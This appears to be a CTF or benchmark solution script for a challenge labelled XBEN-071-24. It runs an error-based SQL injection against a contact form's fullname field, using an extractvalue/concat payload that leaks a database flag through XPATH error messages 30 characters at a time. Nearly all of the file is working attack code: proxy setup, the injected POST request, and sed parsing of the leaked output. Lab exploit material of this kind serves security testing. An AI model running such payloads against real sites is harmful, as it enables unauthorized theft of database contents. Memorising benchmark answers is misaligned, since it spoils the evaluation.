#!/usr/bin/env bash
# XBEN-071-24 — error-based SQL injection (extractvalue). Proxy-mode twin. The
# contact form's fullname is injectable; extractvalue raises an XPATH error that
# leaks 30 chars of the flag at a time, read out of the error message.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben071p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/index.html"; BASE="$(req_of GET index.html)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
window() {
  local out
  out="$("$H5I" websec replay "$BASE" --create --reset-budget --session "$SESSION" \
      --set 'method=POST' --set 'path=/send.php' --set 'form.submit=1' \
      --set "form.fullname=' AND extractvalue(1,concat(0x7e,mid((select flag from flag limit 1),$1,30))) AND '1'='1" \
      --set 'form.email=a@b.c' --set 'form.phone=1' --set 'form.subject=s' --set 'form.message=m' 2>/dev/null)"
  sed -n "s/.*XPATH syntax error: '~\([^']*\)'.*/\1/p" <<<"$out" | head -1
}
flag=''
for start in 1 31 61; do flag="$flag$(window "$start")"; done
echo "$flag"
